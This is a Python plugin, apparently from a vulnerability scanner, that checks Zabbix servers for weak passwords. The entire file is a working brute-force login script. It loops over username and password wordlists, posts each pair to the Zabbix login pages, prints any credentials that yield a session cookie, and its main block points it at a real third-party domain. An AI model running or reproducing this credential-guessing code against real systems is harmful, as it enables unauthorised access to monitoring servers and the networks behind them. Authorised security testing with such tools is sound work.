#!/usr/bin/env python3

from app.lib.utils.request import request
from app.lib.utils.common import get_useragent

class Zabbix_Weakpwd_BaseVerify:
    def __init__(self, url):
        self.info = {
            'name': 'Zabbix弱口令漏洞',
            'description': 'Zabbix弱口令漏洞',
            'date': '',
            'exptype': 'check',
            'type': 'Weakpwd'
        }
        self.url = url
        if not self.url.startswith("http") and not self.url.startswith("https"):
            self.url = "http://" + self.url
        self.headers = {
            'User-Agent': get_useragent(),
            'Content-Type': 'application/x-www-form-urlencoded'
        }

    def check(self):

        """
        检测是否存在漏洞

        :param:

        :return bool True or False: 是否存在漏洞
        """

        urls = []
        urls.append(self.url + '/index.php')
        urls.append(self.url + '/zabbix/index.php')
        for user in open('app/username.txt', 'r', encoding = 'utf-8').readlines():
            user = user.strip()
            for pwd in open('app/password.txt', 'r', encoding = 'utf-8').readlines():
                if pwd != '':
                    pwd = pwd.strip()
                for url in urls:
                    try:
                        data = {
                            'sid': '84fc9ff1d9310695',
                            'form_refresh': 1,
                            'name': user,
                            'password': pwd,
                            'autologin': 1,
                            'enter': 'Sign in'
                        }
                        req = request.post(url, headers = self.headers, data = data)
                        if 'zbx_sessionid' in req.headers['Set-Cookie'] and req.status_code == 302:
                            result = "exists Zabbix weak password, user: %s, pwd: %s"%(user, pwd)
                            #print(req.status_code)
                            print('存在Zabbix弱口令漏洞,弱口令为', result)
                            return True
                    except Exception as e:
                        print(e)
                        pass
        print('不存在Zabbix弱口令漏洞')
        return False

if __name__ == '__main__':
    Zabbix_Weakpwd = Zabbix_Weakpwd_BaseVerify('http://baidu.com')
    Zabbix_Weakpwd.check()